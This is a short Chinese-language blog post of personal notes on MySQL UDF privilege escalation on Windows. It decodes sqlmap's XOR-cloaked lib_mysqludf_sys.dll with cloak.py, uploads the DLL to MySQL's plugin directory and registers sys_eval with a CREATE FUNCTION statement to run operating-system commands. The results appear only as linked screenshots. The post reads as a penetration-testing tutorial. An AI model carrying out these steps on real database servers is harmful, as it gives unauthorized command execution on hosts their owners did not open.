---
layout:     post
title:      windows mysql udf提权笔录
subtitle:   
date:       2019-02-26
author:     跳跳龙
header-img: img/post-bg-ios9-web.jpg
catalog: true
tags:
    - mysql
    - udf
    
---

1.解码sqlmap/udf 目录下的dll文件。

![](http://tiaotiaolong.cn-bj.ufileos.com/blog12-01.jpg)

2.按照mysql的位数来确定。原文件是xor编码的，需要用sqlmap的解码工具。位置在sqlmap的extra目录下。

```
python cloak.py -d -i ../../udf/mysql/windows/64/lib_mysqludf_sys.dll_
```

3.解码完毕之后发现目录下多了一个dll文件 lib_mysqludf.dll。
4.将文件上传到mysql的安装目录下的plugin的目录下。

![](http://tiaotiaolong.cn-bj.ufileos.com/blog12-02.jpg)

5.引入我们的dll文件。

```
create function sys_eval returns string soname 'lib_mysqludf_sys.dll'
```
其中，sys_eval函数是dll文件中提供的。具体的还有很多，如下：

```

strings udf.dll

```
![](http://tiaotiaolong.cn-bj.ufileos.com/blog12-03.jpg)


![](http://tiaotiaolong.cn-bj.ufileos.com/blog12-04.jpg)
这样就是引入成功了，这个时候sys_eval这个函数就是用户自定义的并且可以使用了。

6.test
![](http://tiaotiaolong.cn-bj.ufileos.com/blog12-05.jpg)






